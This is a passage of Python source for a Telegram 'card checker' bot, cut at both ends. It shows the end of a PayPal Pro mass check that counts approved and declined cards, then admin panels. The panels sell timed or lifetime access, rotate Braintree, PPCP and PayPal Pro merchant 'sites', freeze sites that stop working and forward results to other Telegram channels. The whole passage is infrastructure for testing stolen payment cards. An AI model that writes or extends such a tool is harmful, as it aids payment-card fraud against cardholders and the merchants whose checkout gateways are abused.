                    pass  # Ignore edit errors

            # Send final summary
            summary = f"📊 PayPal Pro Mass Check Complete\n\n"
            summary += f"Total Cards: {total_cards}\n"
            summary += f"✅ Approved: {approved_count}\n"
            summary += f"❌ Declined: {declined_count}"

            await update.message.reply_text(summary)

            # Delete the progress message
            try:
                await status_msg.delete()
            except:
                pass
        finally:
            # Always unregister the mass check when done
            unregister_mass_check(user_id)


async def admin_menu_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /admin command - show admin menu"""
    user_id = update.effective_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await update.message.reply_text("❌ This command is only available to admins and mods.")
        return
    
    is_admin = user_id == ADMIN_ID
    
    # Create inline keyboard for admin menu
    keyboard = [
        [
            InlineKeyboardButton("👥 Approve User", callback_data='admin_approve'),
            InlineKeyboardButton("📋 List Users", callback_data='admin_list_users'),
        ],
        [
            InlineKeyboardButton("⏱️ Set Check Interval", callback_data='admin_set_interval'),
            InlineKeyboardButton("📊 View Stats", callback_data='admin_stats'),
        ],
        [
            InlineKeyboardButton("🗑️ Remove User", callback_data='admin_remove'),
        ],
        [
            InlineKeyboardButton("⚙️ Settings", callback_data='admin_settings'),
        ],
    ]
    
    # Only admin can manage mods
    if is_admin:
        keyboard.append([
            InlineKeyboardButton("👮 Manage Mods", callback_data='admin_manage_mods'),
        ])
    
    keyboard.append([
        InlineKeyboardButton("❌ Close", callback_data='admin_close'),
    ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    role_text = "Admin" if is_admin else "Mod"
    await update.message.reply_text(
        f"🔧 *{role_text} Control Panel*\n\nSelect an option:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin menu callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    is_admin = user_id == ADMIN_ID
    action = query.data
    
    if action == 'admin_approve':
        await query.edit_message_text(
            "👥 *Approve User*\n\n"
            "Use the command: `/approve <user_id>`\n"
            "Example: `/approve 7405189284`",
            parse_mode='Markdown'
        )
    
    elif action == 'admin_list_users':
        db = load_user_db()
        if not db:
            await query.edit_message_text("📋 *User List*\n\nNo users found.", parse_mode='Markdown')
            return
        
        user_list = "📋 *Approved Users*\n\n"
        for user_id_str, user_data in db.items():
            access_type = user_data.get('access_type', 'unknown')
            expiry = user_data.get('expiry_date')
            
            if access_type == 'lifetime':
                status = "♾️ Lifetime"
            else:
                expiry_date = datetime.fromisoformat(expiry)
                if datetime.now() > expiry_date:
                    status = "❌ Expired"
                else:
                    days_left = (expiry_date - datetime.now()).days
                    status = f"✅ {days_left} days left"
            
            user_list += f"• User ID: `{user_id_str}` - {status}\n"
        
        await query.edit_message_text(user_list, parse_mode='Markdown')
    
    elif action == 'admin_set_interval':
        # Create keyboard for interval selection
        keyboard = [
            [
                InlineKeyboardButton("0.5s", callback_data='interval_0.5'),
                InlineKeyboardButton("1s", callback_data='interval_1'),
            ],
            [
                InlineKeyboardButton("2s", callback_data='interval_2'),
                InlineKeyboardButton("5s", callback_data='interval_5'),
            ],
            [
                InlineKeyboardButton("10s", callback_data='interval_10'),
                InlineKeyboardButton("❌ Cancel", callback_data='admin_close'),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"⏱️ *Set Check Interval*\n\n"
            f"Current interval: {RATE_LIMIT_SECONDS}s\n\n"
            "Select new interval:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'admin_stats':
        db = load_user_db()
        total_users = len(db)
        active_users = sum(1 for u in db.values() if u.get('access_type') == 'lifetime' or 
                          (u.get('expiry_date') and datetime.now() < datetime.fromisoformat(u.get('expiry_date'))))
        expired_users = total_users - active_users
        
        # Get mods count
        mods_db = load_mods_db()
        mods_count = len(mods_db)
        
        stats_text = f"📊 *Bot Statistics*\n\n"
        stats_text += f"👥 Total Users: {total_users}\n"
        stats_text += f"✅ Active Users: {active_users}\n"
        stats_text += f"❌ Expired Users: {expired_users}\n"
        stats_text += f"👮 Mods: {mods_count}\n"
        stats_text += f"⏱️ Check Interval: {RATE_LIMIT_SECONDS}s"
        
        await query.edit_message_text(stats_text, parse_mode='Markdown')
    
    elif action == 'admin_remove':
        await query.edit_message_text(
            "🗑️ *Remove User*\n\n"
            "Use the command: `/remove <user_id>`\n"
            "Example: `/remove 7405189284`",
            parse_mode='Markdown'
        )
    
    elif action == 'admin_settings':
        # Show settings submenu
        keyboard = [
            [
                InlineKeyboardButton("🌐 B3 Sites", callback_data='settings_b3_sites'),
            ],
            [
                InlineKeyboardButton("🧪 B3 Sites Test", callback_data='settings_b3_test'),
            ],
            [
                InlineKeyboardButton("🎛️ B3 Control", callback_data='settings_control_b3'),
            ],
            [
                InlineKeyboardButton("🔗 PPCP Sites", callback_data='settings_ppcp_sites'),
            ],
            [
                InlineKeyboardButton("💳 PayPal Pro Sites", callback_data='settings_paypalpro_sites'),
            ],
            [
                InlineKeyboardButton("📡 B3 Forwarders", callback_data='settings_forwarders_b3'),
            ],
            [
                InlineKeyboardButton("📡 PP Forwarders", callback_data='settings_forwarders_pp'),
            ],
            [
                InlineKeyboardButton("📡 PPRO Forwarders", callback_data='settings_forwarders_ppro'),
            ],
            [
                InlineKeyboardButton("⏰ Auto-Scan Settings", callback_data='settings_auto_scan'),
            ],
            [
                InlineKeyboardButton("🔄 Mass Check Settings", callback_data='settings_mass'),
            ],
            [
                InlineKeyboardButton("⏱️ Gateway Check Intervals", callback_data='settings_gateway_intervals'),
            ],
            [
                InlineKeyboardButton("📝 Start Message", callback_data='settings_start_message'),
            ],
            [
                InlineKeyboardButton("📢 Send & Pin Message", callback_data='settings_broadcast'),
            ],
            [
                InlineKeyboardButton("⬅️ Back", callback_data='admin_back_main'),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "⚙️ *Settings*\n\nSelect a settings category:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'admin_manage_mods':
        # Only admin can manage mods
        if not is_admin:
            await query.edit_message_text("❌ Only the admin can manage mods.")
            return
        
        mods_db = get_all_mods()
        
        keyboard = [
            [InlineKeyboardButton("➕ Add Mod", callback_data='mods_add')],
        ]
        
        if mods_db:
            keyboard.append([InlineKeyboardButton("📋 List Mods", callback_data='mods_list')])
            keyboard.append([InlineKeyboardButton("➖ Remove Mod", callback_data='mods_remove')])
        
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_back_main')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"👮 *Manage Mods*\n\nCurrent mods: {len(mods_db)}\n\nSelect an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'admin_back_main':
        # Go back to main admin menu
        keyboard = [
            [
                InlineKeyboardButton("👥 Approve User", callback_data='admin_approve'),
                InlineKeyboardButton("📋 List Users", callback_data='admin_list_users'),
            ],
            [
                InlineKeyboardButton("⏱️ Set Check Interval", callback_data='admin_set_interval'),
                InlineKeyboardButton("📊 View Stats", callback_data='admin_stats'),
            ],
            [
                InlineKeyboardButton("🗑️ Remove User", callback_data='admin_remove'),
            ],
            [
                InlineKeyboardButton("⚙️ Settings", callback_data='admin_settings'),
            ],
        ]
        
        # Only admin can manage mods
        if is_admin:
            keyboard.append([
                InlineKeyboardButton("👮 Manage Mods", callback_data='admin_manage_mods'),
            ])
        
        keyboard.append([
            InlineKeyboardButton("❌ Close", callback_data='admin_close'),
        ])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        role_text = "Admin" if is_admin else "Mod"
        await query.edit_message_text(
            f"🔧 *{role_text} Control Panel*\n\nSelect an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'admin_close':
        await query.delete_message()

async def interval_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle interval selection callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    global RATE_LIMIT_SECONDS
    
    interval_str = query.data.replace('interval_', '')
    try:
        new_interval = float(interval_str)
        RATE_LIMIT_SECONDS = new_interval
        
        await query.edit_message_text(
            f"✅ *Check Interval Updated*\n\n"
            f"New interval: {new_interval}s\n\n"
            "This will apply to all future checks.",
            parse_mode='Markdown'
        )
    except ValueError:
        await query.edit_message_text("❌ Invalid interval value.")

# Store pending file edits (admin_id -> {site, file, awaiting_content})
pending_file_edits = {}
pending_file_edits_lock = threading.Lock()

async def settings_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle settings menu callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action == 'settings_b3_sites':
        # Show list of B3 sites
        sites = get_all_b3_sites()
        
        if not sites:
            await query.edit_message_text(
                "🌐 *B3 Sites*\n\nNo B3 sites found (site\\_ folders).",
                parse_mode='Markdown'
            )
            return
        
        keyboard = []
        for site in sites:
            keyboard.append([InlineKeyboardButton(f"📁 {site}", callback_data=f'b3site_{site}')])
        
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🌐 *B3 Sites*\n\nFound {len(sites)} site(s). Select a site to manage:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'settings_b3_test':
        # Show B3 sites test panel - includes frozen sites
        sites = get_all_b3_sites()
        freeze_state = load_site_freeze_state()
        
        if not sites:
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "🧪 *B3 Sites Test*\n\nNo B3 sites found (site\\_ folders).",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            return
        
        keyboard = []
        for site in sites:
            is_frozen = freeze_state.get(site, {}).get('frozen', False)
            status_emoji = "🔴" if is_frozen else "🟢"
            keyboard.append([
                InlineKeyboardButton(f"{status_emoji} {site}", callback_data=f'b3testinfo_{site}'),
                InlineKeyboardButton("🧪 Test", callback_data=f'b3test_{site}')
            ])
        
        keyboard.append([InlineKeyboardButton("🔄 Test All", callback_data='b3test_all')])
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Count active/frozen sites
        active_count = sum(1 for s in sites if not freeze_state.get(s, {}).get('frozen', False))
        frozen_count = len(sites) - active_count
        
        await query.edit_message_text(
            f"🧪 *B3 Sites Test*\n\n🟢 Active: {active_count} | 🔴 Frozen: {frozen_count}\n\nSelect a site to test or test all:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'settings_control_b3':
        # Show B3 control panel with freeze/unfreeze options
        sites = get_all_b3_sites()
        freeze_state = load_site_freeze_state()
        
        if not sites:
            await query.edit_message_text(
                "🎛️ *B3 Control*\n\nNo B3 sites found (site\\_ folders).",
                parse_mode='Markdown'
            )
            return
        
        keyboard = []
        for site in sites:
            is_frozen = freeze_state.get(site, {}).get('frozen', False)
            status_emoji = "🔴" if is_frozen else "🟢"
            action_text = "Unfreeze" if is_frozen else "Freeze"
            keyboard.append([
                InlineKeyboardButton(f"{status_emoji} {site}", callback_data=f'b3info_{site}'),
                InlineKeyboardButton(f"{'🔓' if is_frozen else '🔒'} {action_text}", callback_data=f'b3toggle_{site}')
            ])
        
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Count active/frozen sites
        active_count = sum(1 for s in sites if not freeze_state.get(s, {}).get('frozen', False))
        frozen_count = len(sites) - active_count
        
        await query.edit_message_text(
            f"🎛️ *B3 Control Panel*\n\n🟢 Active: {active_count} | 🔴 Frozen: {frozen_count}\n\nSelect a site to toggle freeze status:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'settings_ppcp_sites':
        # Show PPCP sites management
        sites = load_ppcp_sites()
        auto_remove_settings = load_ppcp_auto_remove_settings()
        auto_remove_enabled = auto_remove_settings.get('enabled', True)
        
        auto_remove_status = "🟢 ON" if auto_remove_enabled else "🔴 OFF"
        
        keyboard = [
            [InlineKeyboardButton("➕ Add Site", callback_data='ppcp_add_site')],
        ]
        
        if sites:
            keyboard.append([InlineKeyboardButton("📋 View Sites", callback_data='ppcp_view_sites')])
            keyboard.append([InlineKeyboardButton("➖ Remove Site", callback_data='ppcp_remove_site')])
        
        keyboard.append([InlineKeyboardButton(f"🗑️ Auto-Remove Bad Sites: {auto_remove_status}", callback_data='ppcp_toggle_auto_remove')])
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🔗 *PPCP Sites*\n\nTotal sites: {len(sites)}\nAuto-Remove Bad Sites: {auto_remove_status}\n\nSelect an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'settings_auto_scan':
        # Show auto-scan settings
        settings = load_auto_scan_settings()
        enabled = settings.get('enabled', False)
        interval = settings.get('interval_hours', 1)
        
        status_text = "🟢 Enabled" if enabled else "🔴 Disabled"
        
        keyboard = [
            [InlineKeyboardButton(f"{'🔴 Disable' if enabled else '🟢 Enable'}", callback_data='autoscan_toggle')],
            [
                InlineKeyboardButton("1h", callback_data='autoscan_interval_1'),
                InlineKeyboardButton("2h", callback_data='autoscan_interval_2'),
                InlineKeyboardButton("6h", callback_data='autoscan_interval_6'),
            ],
            [
                InlineKeyboardButton("12h", callback_data='autoscan_interval_12'),
                InlineKeyboardButton("24h", callback_data='autoscan_interval_24'),
            ],
            [InlineKeyboardButton("🔄 Run Scan Now", callback_data='autoscan_run_now')],
            [InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"⏰ *Auto-Scan Settings*\n\nStatus: {status_text}\nInterval: Every {interval} hour(s)\n\nAuto-scan tests all non-frozen B3 sites and freezes non-working ones.\n\nSelect interval or toggle:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action.startswith('settings_forwarders_'):
        # Forward to forwarders_callback_handler
        await forwarders_callback_handler(update, context)
    
    elif action == 'settings_paypalpro_sites':
        # Show PayPal Pro sites management
        sites = load_paypalpro_sites()
        
        keyboard = [
            [InlineKeyboardButton("➕ Add Site", callback_data='ppro_add_site')],
        ]
        
        if sites:
            keyboard.append([InlineKeyboardButton("📋 View Sites", callback_data='ppro_view_sites')])
            keyboard.append([InlineKeyboardButton("➖ Remove Site", callback_data='ppro_remove_site')])
        
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"💳 *PayPal Pro Sites*\n\nTotal sites: {len(sites)}\n\nSelect an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'settings_mass':
        # Show mass check settings
        settings = load_mass_settings()
        
        b3_status = "🟢 ON" if settings.get('b3', True) else "🔴 OFF"
        pp_status = "🟢 ON" if settings.get('pp', True) else "🔴 OFF"
        ppro_status = "🟢 ON" if settings.get('ppro', True) else "🔴 OFF"
        
        keyboard = [
            [InlineKeyboardButton(f"B3 Mass: {b3_status}", callback_data='mass_toggle_b3')],
            [InlineKeyboardButton(f"PP Mass: {pp_status}", callback_data='mass_toggle_pp')],
            [InlineKeyboardButton(f"PPRO Mass: {ppro_status}", callback_data='mass_toggle_ppro')],
            [InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🔄 *Mass Check Settings*\n\n"
            "Enable or disable mass checking for each gateway:\n\n"
            f"• B3 (Braintree Auth): {b3_status}\n"
            f"• PP (PPCP): {pp_status}\n"
            f"• PPRO (PayPal Pro): {ppro_status}\n\n"
            "Click to toggle:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'settings_gateway_intervals':
        # Show gateway check interval settings
        intervals = get_all_gateway_intervals()
        
        b3_interval = intervals.get('b3', 1)
        pp_interval = intervals.get('pp', 1)
        ppro_interval = intervals.get('ppro', 1)
        
        keyboard = [
            [InlineKeyboardButton(f"⏱️ B3: {b3_interval}s", callback_data='gwinterval_b3')],
            [InlineKeyboardButton(f"⏱️ PP: {pp_interval}s", callback_data='gwinterval_pp')],
            [InlineKeyboardButton(f"⏱️ PPRO: {ppro_interval}s", callback_data='gwinterval_ppro')],
            [InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "⏱️ *Gateway Check Intervals*\n\n"
            "Set the check interval (delay between checks) for each gateway:\n\n"
            f"• B3 (Braintree Auth): {b3_interval} second(s)\n"
            f"• PP (PPCP): {pp_interval} second(s)\n"
            f"• PPRO (PayPal Pro): {ppro_interval} second(s)\n\n"
            "Click a gateway to change its interval:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'settings_start_message':
        # Show start message settings
        current_message = get_start_message()
        
        keyboard = [
            [InlineKeyboardButton("✏️ Edit Start Message", callback_data='startmsg_edit')],
            [InlineKeyboardButton("🔄 Reset to Default", callback_data='startmsg_reset')],
            [InlineKeyboardButton("👁️ Preview Current", callback_data='startmsg_preview')],
            [InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        status = "Custom message set" if current_message else "Using default message"
        
        await query.edit_message_text(
            f"📝 *Start Message Settings*\n\n"
            f"Status: {status}\n\n"
            "The start message is shown when users send /start command.\n\n"
            "Select an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'settings_broadcast':
        # Show broadcast/pin message settings
        keyboard = [
            [InlineKeyboardButton("📢 Send Message to All Users", callback_data='broadcast_send')],
            [InlineKeyboardButton("📌 Send & Pin Message", callback_data='broadcast_pin')],
            [InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Count users
        db = load_user_db()
        user_count = len(db)
        
        await query.edit_message_text(
            f"📢 *Send & Pin Message*\n\n"
            f"Total users in database: {user_count}\n\n"
            "Send a message to all approved users or send and pin a message.\n\n"
            "Select an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

async def forwarders_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle forwarder settings callbacks"""
    query = update.callback_query
    
    # Only answer if not already answered
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    # Determine gateway from action
    if action.startswith('settings_forwarders_'):
        gateway = action.replace('settings_forwarders_', '')
        gateway_names = {"b3": "B3", "pp": "PP", "ppro": "PPRO"}
        gateway_name = gateway_names.get(gateway, gateway.upper())
        
        # Show forwarders list
        forwarders = get_forwarders(gateway)
        
        keyboard = [
            [InlineKeyboardButton("➕ Add Forwarder", callback_data=f'fwd_add_{gateway}')],
        ]
        
        if forwarders:
            for idx, fwd in enumerate(forwarders):
                status = "🟢" if fwd.get('enabled', True) else "🔴"
                keyboard.append([
                    InlineKeyboardButton(f"{status} {fwd['name']}", callback_data=f'fwd_view_{gateway}_{idx}'),
                    InlineKeyboardButton("🧪 Test", callback_data=f'fwd_test_{gateway}_{idx}')
                ])
        
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"📡 *{gateway_name} Forwarders*\n\nTotal: {len(forwarders)}\n\nSelect an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action.startswith('fwd_add_'):
        gateway = action.replace('fwd_add_', '')
        gateway_names = {"b3": "B3", "pp": "PP", "ppro": "PPRO"}
        gateway_name = gateway_names.get(gateway, gateway.upper())
        
        # Store the gateway in user context for the next message
        context.user_data['forwarder_action'] = 'add'
        context.user_data['forwarder_gateway'] = gateway
        context.user_data['forwarder_step'] = 'name'
        
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data=f'settings_forwarders_{gateway}')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"➕ *Add {gateway_name} Forwarder*\n\n"
            "Step 1/3: Enter a custom name for this forwarder\n"
            "Example: My Channel",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action.startswith('fwd_view_'):
        parts = action.split('_')
        gateway = parts[2]
        idx = int(parts[3])
        gateway_names = {"b3": "B3", "pp": "PP", "ppro": "PPRO"}
        gateway_name = gateway_names.get(gateway, gateway.upper())
        
        forwarders = get_forwarders(gateway)
        if idx >= len(forwarders):
            await query.edit_message_text("❌ Forwarder not found.")
            return
        
        fwd = forwarders[idx]
        status = "🟢 Enabled" if fwd.get('enabled', True) else "🔴 Disabled"
        
        keyboard = [
            [
                InlineKeyboardButton("✏️ Edit Name", callback_data=f'fwd_edit_name_{gateway}_{idx}'),
                InlineKeyboardButton("🔑 Edit Token", callback_data=f'fwd_edit_token_{gateway}_{idx}')
            ],
            [
                InlineKeyboardButton("💬 Edit Chat ID", callback_data=f'fwd_edit_chat_{gateway}_{idx}'),
                InlineKeyboardButton(f"{'🔴 Disable' if fwd.get('enabled', True) else '🟢 Enable'}", callback_data=f'fwd_toggle_{gateway}_{idx}')
            ],
            [
                InlineKeyboardButton("🧪 Test", callback_data=f'fwd_test_{gateway}_{idx}'),
                InlineKeyboardButton("🗑️ Remove", callback_data=f'fwd_remove_{gateway}_{idx}')
            ],
            [InlineKeyboardButton("⬅️ Back", callback_data=f'settings_forwarders_{gateway}')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Mask bot token for security
        masked_token = fwd['bot_token'][:10] + "..." + fwd['bot_token'][-5:] if len(fwd['bot_token']) > 15 else "***"
        
        await query.edit_message_text(
            f"📡 *{gateway_name} Forwarder: {fwd['name']}*\n\n"
            f"Status: {status}\n"
            f"Bot Token: `{masked_token}`\n"
            f"Chat ID: `{fwd['chat_id']}`\n\n"
            "Select an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action.startswith('fwd_edit_'):
        parts = action.split('_')
        field = parts[2]
        gateway = parts[3]
        idx = int(parts[4])
        gateway_name = "B3" if gateway == "b3" else "PP"
        
        # Store context for next message
        context.user_data['forwarder_action'] = 'edit'
        context.user_data['forwarder_gateway'] = gateway
        context.user_data['forwarder_index'] = idx
        context.user_data['forwarder_field'] = field
        
        field_names = {
            'name': 'Name',
            'token': 'Bot Token',
            'chat': 'Chat ID'
        }
        
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data=f'fwd_view_{gateway}_{idx}')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"✏️ *Edit {field_names[field]}*\n\n"
            f"Enter the new {field_names[field].lower()}:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action.startswith('fwd_toggle_'):
        parts = action.split('_')
        gateway = parts[2]
        idx = int(parts[3])
        
        forwarders = get_forwarders(gateway)
        if idx >= len(forwarders):
            await query.edit_message_text("❌ Forwarder not found.")
            return
        
        current_status = forwarders[idx].get('enabled', True)
        update_forwarder(gateway, idx, enabled=not current_status)
        
        # Refresh the view
        await forwarders_callback_handler(update, context)
    
    elif action.startswith('fwd_remove_'):
        parts = action.split('_')
        gateway = parts[2]
        idx = int(parts[3])
        
        forwarders = get_forwarders(gateway)
        if idx >= len(forwarders):
            await query.edit_message_text("❌ Forwarder not found.")
            return
        
        fwd_name = forwarders[idx]['name']
        remove_forwarder(gateway, idx)
        
        await query.answer(f"✅ Removed forwarder: {fwd_name}")
        
        # Go back to forwarders list
        context.user_data['callback_query'] = query
        query.data = f'settings_forwarders_{gateway}'
        await forwarders_callback_handler(update, context)
    
    elif action.startswith('fwd_test_'):
        parts = action.split('_')
        gateway = parts[2]
        idx = int(parts[3])
        gateway_names = {"b3": "B3", "pp": "PP", "ppro": "PPRO"}
        gateway_name = gateway_names.get(gateway, gateway.upper())
        
        forwarders = get_forwarders(gateway)
        if idx >= len(forwarders):
            await query.answer("❌ Forwarder not found.", show_alert=True)
            return
        
        fwd = forwarders[idx]
        
        # Send test message
        test_message = f"🧪 Test message from {gateway_name} Forwarder\n\nForwarder: {fwd['name']}\nThis is a test to verify the configuration."
        
        try:
            import aiohttp
            url = f"https://api.telegram.org/bot{fwd['bot_token']}/sendMessage"
            data = {
                'chat_id': fwd['chat_id'],
                'text': test_message
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data=data, timeout=10) as response:
                    if response.status == 200:
                        await query.answer(f"✅ Test message sent successfully to {fwd['name']}!", show_alert=True)
                    else:
                        error_text = await response.text()
                        await query.answer(f"❌ Failed to send test message: HTTP {response.status}", show_alert=True)
        except Exception as e:
            await query.answer(f"❌ Error: {str(e)}", show_alert=True)

async def b3site_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle B3 site selection callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action.startswith('b3site_'):
        # Show files in selected site
        site_folder = action.replace('b3site_', '')
        files = get_site_files(site_folder)
        
        if not files:
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='settings_b3_sites')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                f"📁 *{site_folder}*\n\n"
                "No editable files found in this site folder.",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            return
        
        keyboard = []
        for file in files:
            keyboard.append([InlineKeyboardButton(f"📄 {file}", callback_data=f'b3file_{site_folder}|{file}')])
        
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='settings_b3_sites')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"📁 *{site_folder}*\n\n"
            f"Found {len(files)} file(s). Select a file to view/edit:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

async def b3file_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle B3 file selection callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action.startswith('b3file_'):
        # Show file content and edit options
        parts = action.replace('b3file_', '').split('|')
        if len(parts) != 2:
            await query.edit_message_text("❌ Invalid file selection.")
            return
        
        site_folder, filename = parts
        content = read_site_file(site_folder, filename)
        
        # Truncate content if too long for Telegram message
        max_content_length = 3000
        truncated = False
        if len(content) > max_content_length:
            content = content[:max_content_length]
            truncated = True
        
        keyboard = [
            [InlineKeyboardButton("✏️ Edit File", callback_data=f'b3edit_{site_folder}|{filename}')],
            [InlineKeyboardButton("⬅️ Back", callback_data=f'b3site_{site_folder}')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        truncate_notice = "\n\n⚠️ _Content truncated (file too large)_" if truncated else ""
        
        # Escape special Markdown characters in content to prevent parsing errors
        escaped_content = content.replace('`', "'").replace('*', '\\*').replace('_', '\\_').replace('[', '\\[')
        
        await query.edit_message_text(
            f"📄 *{site_folder}/{filename}*\n\n"
            f"```\n{escaped_content}\n```{truncate_notice}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

async def b3edit_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle B3 file edit callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action.startswith('b3edit_'):
        # Prepare for file edit
        parts = action.replace('b3edit_', '').split('|')
        if len(parts) != 2:
            await query.edit_message_text("❌ Invalid file selection.")
            return
        
        site_folder, filename = parts
        
        # Store pending edit (thread-safe)
        with pending_file_edits_lock:
            pending_file_edits[user_id] = {
                'site': site_folder,
                'file': filename,
                'awaiting_content': True
            }
        
        keyboard = [
            [InlineKeyboardButton("❌ Cancel", callback_data=f'b3cancel_{site_folder}|{filename}')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"✏️ *Editing: {site_folder}/{filename}*\n\n"
            "Please send the new content for this file.\n\n"
            "⚠️ The entire file content will be replaced with your message.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

async def b3cancel_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle B3 file edit cancel callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
